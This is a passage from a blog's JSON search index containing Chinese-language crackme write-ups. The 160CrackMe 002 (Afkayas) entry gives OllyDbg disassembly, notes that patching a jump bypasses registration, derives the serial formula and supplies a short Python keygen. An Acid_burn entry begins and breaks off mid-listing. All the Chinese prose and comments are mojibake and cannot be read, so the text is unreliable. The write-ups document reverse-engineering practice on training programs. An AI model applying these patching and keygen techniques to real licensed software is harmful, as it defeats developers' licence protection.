çŠ¶æ€å¯„å­˜å™¨çš„èµ„æ–™ï¼Œå°±å¯ä»¥æå‡ºæ¥äº†\n","permalink":"https://www.hacktech.cn/post/%E4%B8%80%E4%B8%AA%E6%B6%89%E5%8F%8A%E5%88%B0%E6%B5%AE%E7%82%B9%E5%AF%84%E5%AD%98%E5%99%A8%E7%9A%84cm.html","summary":"\u003cp\u003eè¿™æ¬¡æ‰¾å°ä¼™ä¼´è¦äº†ä»–çš„ä¸€ä¸ªCMï¼Œæ€ä¹ˆè¯´å‘¢ï¼Œè¿™CMè®©æˆ‘å­¦åˆ°äº†ä¸å°‘ï¼Œå…¶å®æå‡ºæ¥åæ„Ÿè§‰ä¸éš¾ï¼Œå°±æ˜¯æœ‰ä¸å°‘FPUæµ®ç‚¹ç›¸å…³çš„æŒ‡ä»¤å’ŒFPUå¯„å­˜å™¨å®Œå…¨æ²¡å­¦è¿‡ï¼ŒæŸ¥äº†ä¸å°‘èµ„æ–™ï¼Œå­¦åˆ°äº†å¾ˆå¤š\u003c/p\u003e","title":"ä¸€ä¸ªæ¶‰åŠåˆ°æµ®ç‚¹å¯„å­˜å™¨çš„CM"},{"content":"é¦–å…ˆæŸ¥å£³æ— å£³ï¼Œè¾“å…¥ä¼ªç æŠ¥é”™ï¼Œæ ¹æ®æŠ¥é”™odæŸ¥æ‰¾å­—ç¬¦ä¸²ï¼Œå®šä½åˆ°é”™è¯¯ä»£ç é™„è¿‘ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸ªæ¡ä»¶è·³è½¬ï¼Œæ”¹æ‰å°±å¯ä»¥çˆ†ç ´ï¼Œæ¥ä¸‹æ¥åˆ†æä¸‹æ³¨å†Œç®—æ³•ï¼Œæˆ‘ä»¬å‘¨å›´çœ‹çœ‹ï¼Œä»æœ€è¿‘å‡ ä¸ªcallçœ‹ï¼Œå¹¶æ²¡æœ‰æˆ‘ä»¬è¾“å…¥çš„ç”¨æˆ·ååœ¨å †æ ˆä¸­å‡ºç°ï¼Œé‚£æˆ‘ä»¬ç›´æ¥ä»è¿™ä¸ªå‡½æ•°å¼€å¤´å¾€ä¸‹æ‰¾ï¼Œä¸€èˆ¬ä¸€ä¸ªå‡½æ•°å¼€å¤´æ˜¯push ebpä¸€æ®µä»£ç ç”¨æ¥æå‡å †æ ˆï¼Œæ‰¾åˆ°åæˆ‘ä»¬å¾€ä¸‹æ‰¾ï¼Œæ³¨æ„å †æ ˆï¼Œç›´åˆ°æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦å‡ºç°ï¼Œå¼€å§‹ç»†å¿ƒå¾€ä¸‹è·Ÿ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 00402310 \u0026gt; \\55 push ebp 00402311 . 8BEC mov ebp,esp 00402313 . 83EC 0C sub esp,0xC 00402316 . 68 26104000 push \u0026lt;jmp.\u0026amp;MSVBVM50.__vbaExceptHandler\u0026gt; ; SE å¤„ç†ç¨‹åºå®‰è£… 0040231B . 64:A1 0000000\u0026gt;mov eax,dword ptr fs:[0] 00402321 . 50 push eax ; Afkayas_.00402191 00402322 . 64:8925 00000\u0026gt;mov dword ptr fs:[0],esp 00402329 . 81EC B0000000 sub esp,0xB0 0040232F . 53 push ebx 00402330 . 56 push esi 00402331 . 8B75 08 mov esi,dword ptr ss:[ebp+0x8] ; esi -\u0026gt; ASCII \u0026#34;2@\u0026#34; 00402334 . 57 push edi 00402335 . 8BC6 mov eax,esi ; eax -\u0026gt; ASCII \u0026#34;2@\u0026#34; 00402337 . 83E6 FE and esi,-0x2 0040233A . 8965 F4 mov dword ptr ss:[ebp-0xC],esp 0040233D . 83E0 01 and eax,0x1 00402340 . 8B1E mov ebx,dword ptr ds:[esi] 00402342 . C745 F8 08104\u0026gt;mov dword ptr ss:[ebp-0x8],Afkayas_.0040\u0026gt; 00402349 . 56 push esi 0040234A . 8945 FC mov dword ptr ss:[ebp-0x4],eax ; Afkayas_.00402191 0040234D . 8975 08 mov dword ptr ss:[ebp+0x8],esi 00402350 . FF53 04 call dword ptr ds:[ebx+0x4] ; msvbvm50.7404C5C8 00402353 . 8B83 10030000 mov eax,dword ptr ds:[ebx+0x310] 00402359 . 33FF xor edi,edi 0040235B . 56 push esi 0040235C . 897D E8 mov dword ptr ss:[ebp-0x18],edi 0040235F . 897D E4 mov dword ptr ss:[ebp-0x1C],edi 00402362 . 897D E0 mov dword ptr ss:[ebp-0x20],edi 00402365 . 897D DC mov dword ptr ss:[ebp-0x24],edi 00402368 . 897D D8 mov dword ptr ss:[ebp-0x28],edi 0040236B . 897D D4 mov dword ptr ss:[ebp-0x2C],edi 0040236E . 897D C4 mov dword ptr ss:[ebp-0x3C],edi 00402371 . 897D B4 mov dword ptr ss:[ebp-0x4C],edi 00402374 . 897D A4 mov dword ptr ss:[ebp-0x5C],edi 00402377 . 897D 94 mov dword ptr ss:[ebp-0x6C],edi 0040237A . 8985 40FFFFFF mov dword ptr ss:[ebp-0xC0],eax ; Afkayas_.00402191 00402380 . FFD0 call eax ; Afkayas_.00402191 00402382 . 8D4D D4 lea ecx,dword ptr ss:[ebp-0x2C] 00402385 . 50 push eax ; Afkayas_.00402191 00402386 . 51 push ecx 00402387 . FF15 0C414000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaObjSe\u0026gt;; msvbvm50.__vbaObjSet 0040238D . 8B9B 00030000 mov ebx,dword ptr ds:[ebx+0x300] 00402393 . 56 push esi 00402394 . 8985 50FFFFFF mov dword ptr ss:[ebp-0xB0],eax ; Afkayas_.00402191 0040239A . 899D 3CFFFFFF mov dword ptr ss:[ebp-0xC4],ebx 004023A0 . FFD3 call ebx 004023A2 . 8D55 DC lea edx,dword ptr ss:[ebp-0x24] 004023A5 . 50 push eax ; Afkayas_.00402191 004023A6 . 52 push edx 004023A7 . FF15 0C414000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaObjSe\u0026gt;; msvbvm50.__vbaObjSet 004023AD . 8BD8 mov ebx,eax ; Afkayas_.00402191 004023AF . 8D4D E8 lea ecx,dword ptr ss:[ebp-0x18] 004023B2 . 51 push ecx 004023B3 . 53 push ebx 004023B4 . 8B03 mov eax,dword ptr ds:[ebx] 004023B6 . FF90 A0000000 call dword ptr ds:[eax+0xA0] 004023BC . 3BC7 cmp eax,edi 004023BE . 7D 12 jge short Afkayas_.004023D2 004023C0 . 68 A0000000 push 0xA0 004023C5 . 68 5C1B4000 push Afkayas_.00401B5C 004023CA . 53 push ebx 004023CB . 50 push eax ; Afkayas_.00402191 004023CC . FF15 04414000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaHresu\u0026gt;; msvbvm50.__vbaHresultCheckObj 004023D2 \u0026gt; 56 push esi 004023D3 . FF95 3CFFFFFF call dword ptr ss:[ebp-0xC4] 004023D9 . 8D55 D8 lea edx,dword ptr ss:[ebp-0x28] 004023DC . 50 push eax ; Afkayas_.00402191 004023DD . 52 push edx 004023DE . FF15 0C414000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaObjSe\u0026gt;; msvbvm50.__vbaObjSet 004023E4 . 8BD8 mov ebx,eax ; Afkayas_.00402191 004023E6 . 8D4D E4 lea ecx,dword ptr ss:[ebp-0x1C] 004023E9 . 51 push ecx 004023EA . 53 push ebx 004023EB . 8B03 mov eax,dword ptr ds:[ebx] 004023ED . FF90 A0000000 call dword ptr ds:[eax+0xA0] 004023F3 . 3BC7 cmp eax,edi 004023F5 . 7D 12 jge short Afkayas_.00402409 004023F7 . 68 A0000000 push 0xA0 004023FC . 68 5C1B4000 push Afkayas_.00401B5C 00402401 . 53 push ebx 00402402 . 50 push eax ; Afkayas_.00402191 00402403 . FF15 04414000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaHresu\u0026gt;; msvbvm50.__vbaHresultCheckObj 00402409 \u0026gt; 8B95 50FFFFFF mov edx,dword ptr ss:[ebp-0xB0] 0040240F . 8B45 E4 mov eax,dword ptr ss:[ebp-0x1C] ; ç”¨æˆ·å -\u0026gt; eax 00402412 . 50 push eax ; /ç”¨æˆ·å -\u0026gt; å †æ ˆ 00402413 . 8B1A mov ebx,dword ptr ds:[edx] ; | 00402415 . FF15 E4404000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaLenBs\u0026gt;; \\len(ç”¨æˆ·å) -\u0026gt; eax 0040241B . 8BF8 mov edi,eax ; len(ç”¨æˆ·å) -\u0026gt; edi 0040241D . 8B4D E8 mov ecx,dword ptr ss:[ebp-0x18] ; ç”¨æˆ·å -\u0026gt; ecx 00402420 . 69FF FB7C0100 imul edi,edi,0x17CFB ; len(ç”¨æˆ·å) * 0x17CFB ==\u0026gt; edi=A6ADD 00402426 . 51 push ecx ; /String = NULL 00402427 . 0F80 91020000 jo Afkayas_.004026BE ; | 0040242D . FF15 F8404000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.#rtcAnsiVa\u0026gt;; \\ç”¨æˆ·åå»æ‰é¦–å­—æ¯ -\u0026gt; edx 00402433 . 0FBFD0 movsx edx,ax 00402436 . 03FA add edi,edx 00402438 . 0F80 80020000 jo Afkayas_.004026BE 0040243E . 57 push edi ; len(ç”¨æˆ·å) * 0x17CFB å…¥æ ˆ-\u0026gt; ebp-D4 0040243F . FF15 E0404000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaStrI4\u0026gt;; åè¿›åˆ¶(len(ç”¨æˆ·å) * 0x17CFB) + é¦–å­—æ¯åè¿›åˆ¶asciiå€¼ -\u0026gt; eax 00402445 . 8BD0 mov edx,eax ; Afkayas_.00402191 00402447 . 8D4D E0 lea ecx,dword ptr ss:[ebp-0x20] 0040244A . FF15 70414000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaStrMo\u0026gt;; msvbvm50.__vbaStrMove 00402450 . 8BBD 50FFFFFF mov edi,dword ptr ss:[ebp-0xB0] 00402456 . 50 push eax ; Afkayas_.00402191 00402457 . 57 push edi ; åè¿›åˆ¶(len(ç”¨æˆ·å) * 0x17CFB) + é¦–å­—æ¯åè¿›åˆ¶asciiå€¼ å…¥æ ˆ -\u0026gt; ebp-D4 00402458 . FF93 A4000000 call dword ptr ds:[ebx+0xA4] 0040245E . 85C0 test eax,eax ; Afkayas_.00402191 00402460 . 7D 12 jge short Afkayas_.00402474 00402462 . 68 A4000000 push 0xA4 00402467 . 68 5C1B4000 push Afkayas_.00401B5C 0040246C . 57 push edi 0040246D . 50 push eax ; Afkayas_.00402191 0040246E . FF15 04414000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaHresu\u0026gt;; msvbvm50.__vbaHresultCheckObj 00402474 \u0026gt; 8D45 E0 lea eax,dword ptr ss:[ebp-0x20] 00402477 . 8D4D E4 lea ecx,dword ptr ss:[ebp-0x1C] 0040247A . 50 push eax ; Afkayas_.00402191 0040247B . 8D55 E8 lea edx,dword ptr ss:[ebp-0x18] 0040247E . 51 push ecx 0040247F . 52 push edx 00402480 . 6A 03 push 0x3 00402482 . FF15 5C414000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaFreeS\u0026gt;; msvbvm50.__vbaFreeStrList 00402488 . 83C4 10 add esp,0x10 0040248B . 8D45 D4 lea eax,dword ptr ss:[ebp-0x2C] 0040248E . 8D4D D8 lea ecx,dword ptr ss:[ebp-0x28] 00402491 . 8D55 DC lea edx,dword ptr ss:[ebp-0x24] 00402494 . 50 push eax ; Afkayas_.00402191 00402495 . 51 push ecx 00402496 . 52 push edx 00402497 . 6A 03 push 0x3 00402499 . FF15 F4404000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaFreeO\u0026gt;; msvbvm50.__vbaFreeObjList 0040249F . 8B06 mov eax,dword ptr ds:[esi] 004024A1 . 83C4 10 add esp,0x10 004024A4 . 56 push esi 004024A5 . FF90 04030000 call dword ptr ds:[eax+0x304] 004024AB . 8B1D 0C414000 mov ebx,dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaOb\u0026gt;; msvbvm50.__vbaObjSet 004024B1 . 50 push eax ; Afkayas_.00402191 004024B2 . 8D45 DC lea eax,dword ptr ss:[ebp-0x24] 004024B5 . 50 push eax ; Afkayas_.00402191 004024B6 . FFD3 call ebx ; \u0026lt;\u0026amp;MSVBVM50.__vbaObjSet\u0026gt; 004024B8 . 8BF8 mov edi,eax ; Afkayas_.00402191 004024BA . 8D55 E8 lea edx,dword ptr ss:[ebp-0x18] 004024BD . 52 push edx 004024BE . 57 push edi 004024BF . 8B0F mov ecx,dword ptr ds:[edi] 004024C1 . FF91 A0000000 call dword ptr ds:[ecx+0xA0] 004024C7 . 85C0 test eax,eax ; Afkayas_.00402191 004024C9 . 7D 12 jge short Afkayas_.004024DD 004024CB . 68 A0000000 push 0xA0 004024D0 . 68 5C1B4000 push Afkayas_.00401B5C 004024D5 . 57 push edi 004024D6 . 50 push eax ; Afkayas_.00402191 004024D7 . FF15 04414000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaHresu\u0026gt;; msvbvm50.__vbaHresultCheckObj 004024DD \u0026gt; 56 push esi 004024DE . FF95 40FFFFFF call dword ptr ss:[ebp-0xC0] 004024E4 . 50 push eax ; Afkayas_.00402191 004024E5 . 8D45 D8 lea eax,dword ptr ss:[ebp-0x28] 004024E8 . 50 push eax ; Afkayas_.00402191 004024E9 . FFD3 call ebx 004024EB . 8BF0 mov esi,eax ; Afkayas_.00402191 004024ED . 8D55 E4 lea edx,dword ptr ss:[ebp-0x1C] 004024F0 . 52 push edx 004024F1 . 56 push esi 004024F2 . 8B0E mov ecx,dword ptr ds:[esi] 004024F4 . FF91 A0000000 call dword ptr ds:[ecx+0xA0] 004024FA . 85C0 test eax,eax ; Afkayas_.00402191 004024FC . 7D 12 jge short Afkayas_.00402510 004024FE . 68 A0000000 push 0xA0 00402503 . 68 5C1B4000 push Afkayas_.00401B5C 00402508 . 56 push esi 00402509 . 50 push eax ; Afkayas_.00402191 0040250A . FF15 04414000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaHresu\u0026gt;; msvbvm50.__vbaHresultCheckObj 00402510 \u0026gt; 8B45 E8 mov eax,dword ptr ss:[ebp-0x18] ; user32.77D2BBF7 00402513 . 8B4D E4 mov ecx,dword ptr ss:[ebp-0x1C] 00402516 . 8B3D 00414000 mov edi,dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaSt\u0026gt;; åè¿›åˆ¶(len(ç”¨æˆ·å) * 0x17CFB) + é¦–å­—æ¯åè¿›åˆ¶asciiå€¼ -\u0026gt; ecx å¯†ç  -\u0026gt; eax 0040251C . 50 push eax ; Afkayas_.00402191 0040251D . 68 701B4000 push Afkayas_.00401B70 ; \u0026#34;AKA-\u0026#34;å…¥æ ˆ 00402522 . 51 push ecx ; /åè¿›åˆ¶(len(ç”¨æˆ·å) * 0x17CFB) + é¦–å­—æ¯åè¿›åˆ¶asciiå€¼ å…¥æ ˆ 00402523 . FFD7 call edi ; \\\u0026#34;AKA-\u0026#34;+\u0026#34;åè¿›åˆ¶(len(ç”¨æˆ·å) * 0x17CFB) + é¦–å­—æ¯åè¿›åˆ¶asciiå€¼\u0026#34; -\u0026gt; eax 00402525 . 8B1D 70414000 mov ebx,dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaSt\u0026gt;; msvbvm50.__vbaStrMove 0040252B . 8BD0 mov edx,eax ; Afkayas_.00402191 0040252D . 8D4D E0 lea ecx,dword ptr ss:[ebp-0x20] 00402530 . FFD3 call ebx ; \u0026lt;\u0026amp;MSVBVM50.__vbaStrMove\u0026gt; 00402532 . 50 push eax ; Afkayas_.00402191 00402533 . FF15 28414000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaStrCm\u0026gt;; msvbvm50.__vbaStrCmp 00402539 . 8BF0 mov esi,eax ; Afkayas_.00402191 0040253B . 8D55 E0 lea edx,dword ptr ss:[ebp-0x20] 0040253E . F7DE neg esi 00402540 . 8D45 E8 lea eax,dword ptr ss:[ebp-0x18] 00402543 . 52 push edx 00402544 . 1BF6 sbb esi,esi 00402546 . 8D4D E4 lea ecx,dword ptr ss:[ebp-0x1C] 00402549 . 50 push eax ; Afkayas_.00402191 0040254A . 46 inc esi 0040254B . 51 push ecx 0040254C . 6A 03 push 0x3 0040254E . F7DE neg esi 00402550 . FF15 5C414000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaFreeS\u0026gt;; msvbvm50.__vbaFreeStrList 00402556 . 83C4 10 add esp,0x10 00402559 . 8D55 D8 lea edx,dword ptr ss:[ebp-0x28] 0040255C . 8D45 DC lea eax,dword ptr ss:[ebp-0x24] 0040255F . 52 push edx 00402560 . 50 push eax ; Afkayas_.00402191 00402561 . 6A 02 push 0x2 00402563 . FF15 F4404000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaFreeO\u0026gt;; msvbvm50.__vbaFreeObjList 00402569 . 83C4 0C add esp,0xC 0040256C . B9 04000280 mov ecx,0x80020004 00402571 . B8 0A000000 mov eax,0xA 00402576 . 894D 9C mov dword ptr ss:[ebp-0x64],ecx 00402579 . 66:85F6 test si,si 0040257C . 8945 94 mov dword ptr ss:[ebp-0x6C],eax ; Afkayas_.00402191 0040257F . 894D AC mov dword ptr ss:[ebp-0x54],ecx 00402582 . 8945 A4 mov dword ptr ss:[ebp-0x5C],eax ; Afkayas_.00402191 00402585 . 894D BC mov dword ptr ss:[ebp-0x44],ecx 00402588 . 8945 B4 mov dword ptr ss:[ebp-0x4C],eax ; Afkayas_.00402191 0040258B . 74 58 je short Afkayas_.004025E5 0040258D . 68 801B4000 push Afkayas_.00401B80 ; You Get It 00402592 . 68 9C1B4000 push Afkayas_.00401B9C ; \\r\\n 00402597 . FFD7 call edi 00402599 . 8BD0 mov edx,eax ; Afkayas_.00402191 0040259B . 8D4D E8 lea ecx,dword ptr ss:[ebp-0x18] 0040259E . FFD3 call ebx 004025A0 . 50 push eax ; Afkayas_.00402191 004025A1 . 68 A81B4000 push Afkayas_.00401BA8 ; KeyGen It Now 004025A6 . FFD7 call edi 004025A8 . 8D4D 94 lea ecx,dword ptr ss:[ebp-0x6C] 004025AB . 8945 CC mov dword ptr ss:[ebp-0x34],eax ; Afkayas_.00402191 004025AE . 8D55 A4 lea edx,dword ptr ss:[ebp-0x5C] 004025B1 . 51 push ecx 004025B2 . 8D45 B4 lea eax,dword ptr ss:[ebp-0x4C] 004025B5 . 52 push edx 004025B6 . 50 push eax ; Afkayas_.00402191 004025B7 . 8D4D C4 lea ecx,dword ptr ss:[ebp-0x3C] 004025BA . 6A 00 push 0x0 004025BC . 51 push ecx 004025BD . C745 C4 08000\u0026gt;mov dword ptr ss:[ebp-0x3C],0x8 004025C4 . FF15 10414000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.#rtcMsgBox\u0026gt;; msvbvm50.rtcMsgBox 004025CA . 8D4D E8 lea ecx,dword ptr ss:[ebp-0x18] 004025CD . FF15 80414000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaFreeS\u0026gt;; msvbvm50.__vbaFreeStr 004025D3 . 8D55 94 lea edx,dword ptr ss:[ebp-0x6C] 004025D6 . 8D45 A4 lea eax,dword ptr ss:[ebp-0x5C] 004025D9 . 52 push edx 004025DA . 8D4D B4 lea ecx,dword ptr ss:[ebp-0x4C] 004025DD . 50 push eax ; Afkayas_.00402191 004025DE . 8D55 C4 lea edx,dword ptr ss:[ebp-0x3C] 004025E1 . 51 push ecx 004025E2 . 52 push edx 004025E3 . EB 56 jmp short Afkayas_.0040263B 004025E5 \u0026gt; 68 C81B4000 push Afkayas_.00401BC8 ; You Get Wrong 004025EA . 68 9C1B4000 push Afkayas_.00401B9C ; \\r\\n 004025EF . FFD7 call edi 004025F1 . 8BD0 mov edx,eax ; Afkayas_.00402191 004025F3 . 8D4D E8 lea ecx,dword ptr ss:[ebp-0x18] 004025F6 . FFD3 call ebx 004025F8 . 50 push eax ; Afkayas_.00402191 004025F9 . 68 E81B4000 push Afkayas_.00401BE8 ; Try Again é€šè¿‡åˆ†æå¯ä»¥çœ‹åˆ°åŠ å¯†å…³é”®ä»£ç æ˜¯\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0040240F . 8B45 E4 mov eax,dword ptr ss:[ebp-0x1C] ; ç”¨æˆ·å -\u0026gt; eax 00402412 . 50 push eax ; /ç”¨æˆ·å -\u0026gt; å †æ ˆ 00402413 . 8B1A mov ebx,dword ptr ds:[edx] ; | 00402415 . FF15 E4404000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaLenBs\u0026gt;; \\len(ç”¨æˆ·å) -\u0026gt; eax 0040241B . 8BF8 mov edi,eax ; len(ç”¨æˆ·å) -\u0026gt; edi 0040241D . 8B4D E8 mov ecx,dword ptr ss:[ebp-0x18] ; ç”¨æˆ·å -\u0026gt; ecx 00402420 . 69FF FB7C0100 imul edi,edi,0x17CFB ; len(ç”¨æˆ·å) * 0x17CFB ==\u0026gt; edi=A6ADD 00402426 . 51 push ecx ; /String = NULL 00402427 . 0F80 91020000 jo Afkayas_.004026BE ; | 0040242D . FF15 F8404000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.#rtcAnsiVa\u0026gt;; \\ç”¨æˆ·åå»æ‰é¦–å­—æ¯ -\u0026gt; edx 0040243E . 57 push edi ; len(ç”¨æˆ·å) * 0x17CFB å…¥æ ˆ-\u0026gt; ebp-D4 0040243F . FF15 E0404000 call dword ptr ds:[\u0026lt;\u0026amp;MSVBVM50.__vbaStrI4\u0026gt;; åè¿›åˆ¶(len(ç”¨æˆ·å) * 0x17CFB) + é¦–å­—æ¯åè¿›åˆ¶asciiå€¼ -\u0026gt; eax 0040251D . 68 701B4000 push Afkayas_.00401B70 ; \u0026#34;AKA-\u0026#34;å…¥æ ˆ 00402522 . 51 push ecx ; /åè¿›åˆ¶(len(ç”¨æˆ·å) * 0x17CFB) + é¦–å­—æ¯åè¿›åˆ¶asciiå€¼ å…¥æ ˆ 00402523 . FFD7 call edi ; \\\u0026#34;AKA-\u0026#34;+\u0026#34;åè¿›åˆ¶(len(ç”¨æˆ·å) * 0x17CFB) + é¦–å­—æ¯åè¿›åˆ¶asciiå€¼\u0026#34; -\u0026gt; eax å¯ä»¥çœ‹å‡ºæµç¨‹å°±æ˜¯ \u0026ldquo;AKA-\u0026quot;+\u0026ldquo;åè¿›åˆ¶(len(ç”¨æˆ·å) * 0x17CFB) + é¦–å­—æ¯åè¿›åˆ¶asciiå€¼\u0026rdquo;\nå†™æ³¨å†Œæœºï¼ˆPythonï¼‰\n1 2 3 4 5 6 import sys username = sys.argv[1] pwend = len(username) * 0x17CFB + ord(username[0]) password = \u0026#34;AKA-%d\u0026#34;%pwend print(password) æµ‹è¯•ç»“æœ\n1 2 C:\\Users\\Administrator\\Desktop\u0026gt;python 1.py akkuman AKA-682814 ","permalink":"https://www.hacktech.cn/post/160crackme-002.html","summary":"\u003cp\u003eé¦–å…ˆæŸ¥å£³æ— å£³ï¼Œè¾“å…¥ä¼ªç æŠ¥é”™ï¼Œæ ¹æ®æŠ¥é”™odæŸ¥æ‰¾å­—ç¬¦ä¸²ï¼Œå®šä½åˆ°é”™è¯¯ä»£ç é™„è¿‘ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸ªæ¡ä»¶è·³è½¬ï¼Œæ”¹æ‰å°±å¯ä»¥çˆ†ç ´ï¼Œæ¥ä¸‹æ¥åˆ†æä¸‹æ³¨å†Œç®—æ³•ï¼Œæˆ‘ä»¬å‘¨å›´çœ‹çœ‹ï¼Œä»æœ€è¿‘å‡ ä¸ªcallçœ‹ï¼Œå¹¶æ²¡æœ‰æˆ‘ä»¬è¾“å…¥çš„ç”¨æˆ·ååœ¨å †æ ˆä¸­å‡ºç°ï¼Œé‚£æˆ‘ä»¬ç›´æ¥ä»è¿™ä¸ªå‡½æ•°å¼€å¤´å¾€ä¸‹æ‰¾ï¼Œä¸€èˆ¬ä¸€ä¸ªå‡½æ•°å¼€å¤´æ˜¯push ebpä¸€æ®µä»£ç ç”¨æ¥æå‡å †æ ˆï¼Œæ‰¾åˆ°åæˆ‘ä»¬å¾€ä¸‹æ‰¾ï¼Œæ³¨æ„å †æ ˆï¼Œç›´åˆ°æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦å‡ºç°ï¼Œå¼€å§‹ç»†å¿ƒå¾€ä¸‹è·Ÿ\u003c/p\u003e","title":"160CrackMeç»ƒæ‰‹ 002"},{"content":"peidåˆ¤æ–­æ— å£³ï¼Œæ‰“å¼€è¾“å…¥ä¼ªç æ³¨å†Œï¼Œæ ¹æ®æŠ¥é”™odæŸ¥æ‰¾å­—ç¬¦ä¸²\næ¥ä¸‹æ¥å®šä½åˆ°å­—ç¬¦ä¸²å‘¨è¾¹ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 0042FA15 |. 8D55 F0 lea edx,[local.4] 0042FA18 |. 8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC] 0042FA1E |. E8 35B0FEFF call Acid_bur.0041AA58 0042FA23 |. 8B45 F0 mov eax,[local.4] 0042FA26 |. 0FB640 03 movzx eax,byte ptr ds:[eax+0x3] 0042FA2A |. 6BF0 0B imul esi,eax,0xB 0042FA2D |. 8D55 EC lea edx,[local.5] 0042FA30 |. 8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC] 0042FA36 |. E8 1DB0FEFF call Acid_bur.0041AA58 0042FA3B |. 8B45 EC mov eax,[local.5] ; å †æ ˆä¸­å¯çœ‹åˆ°[local.5å’Œ4]éƒ½æ˜¯ä½ è¾“å…¥çš„ç”¨æˆ·å 0042FA3E |. 0FB640 02 movzx eax,byte ptr ds:[eax+0x2] 0042FA42 |. 6BC0 0E imul eax,eax,0xE 0042FA45 |. 03F0 add esi,eax 0042FA47 |. 8935 58174300 mov dword ptr ds:[0x431758],esi 0042FA4D |. A1 6C174300 mov eax,dword ptr ds:[0x43176C] 0042FA52 |. E8 D96EFDFF call Acid_bur.00406930 0042FA57 |. 83F8 04 cmp eax,0x4 ; å¦‚æœç”¨æˆ·åé•¿åº¦å¤§äºç­‰äº4è·³è½¬ 0042FA5A |. 7D 1D jge short Acid_bur.0042FA79 0042FA5C |. 6A 00 push 0x0 0042FA5E |. B9 74FB4200 mov ecx,Acid_bur.0042FB74 ; Try Again! 0042FA63 |. BA 80FB4200 mov edx,Acid_bur.0042FB80 ; Sorry , The serial is incorect ! 0042FA68 |. A1 480A4300 mov eax,dword ptr ds:[0x430A48] 0042FA6D |. 8B00 mov eax,dword ptr ds:[eax] 0042FA6F |. E8 FCA6FFFF call Acid_bur.0042A170 0042FA74 |. E9 BE000000 jmp Acid_bur.0042FB37 0042FA79 |\u0026gt; 8D55 F0 lea edx,[local.4] 0042FA7C |. 8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC] 0042FA82 |. E8 D1AFFEFF call Acid_bur.0041AA58 0042FA87 |. 8B45 F0 mov eax,[local.4] ; å–ä½ è¾“å…¥çš„ç”¨æˆ·å 0042FA8A |. 0FB600 movzx eax,byte ptr ds:[eax] ; å–ç”¨æˆ·åçš„ç¬¬ä¸€ä¸ªå­—æ¯æ”¾å…¥eax 0042FA8D |. F72D 50174300 imul dword ptr ds:[0x431750] ; eax = eax * 29h 0042FA93 |. A3 50174300 mov dword ptr ds:[0x431750],eax 0042FA98 |. A1 50174300 mov eax,dword ptr ds:[0x431750] 0042FA9D |. 0105 50174300 add dword ptr ds:[0x431750],eax ; [0x431750] = eax * 2 0042FAA3 |. 8D45 FC lea eax,[local.1] 0042FAA6 |. BA ACFB4200 mov edx,Acid_bur.0042FBAC ; CW 0042FAAB |. E8 583CFDFF call Acid_bur.00403708 ; è§‚å¯Ÿå †æ ˆå¯å‘ç°\u0026#34;CW\u0026#34;æ”¾å…¥äº†[local.1] 0042FAB0 |. 8D45 F8 lea eax,[local.2] 0042FAB3 |. BA B8FB4200 mov edx,Acid_bur.0042FBB8 ; CRACKED 0042FAB8 |. E8 4B3CFDFF call Acid_bur.00403708 ; è§‚å¯Ÿå †æ ˆå¯å‘ç°\u0026#34;CRACKED\u0026#34;æ”¾å…¥äº†[local.2] 0042FABD |. FF75 FC push [local.1] ; Acid_bur.0042FBAC 0042FAC0 |. 68 C8FB4200 push 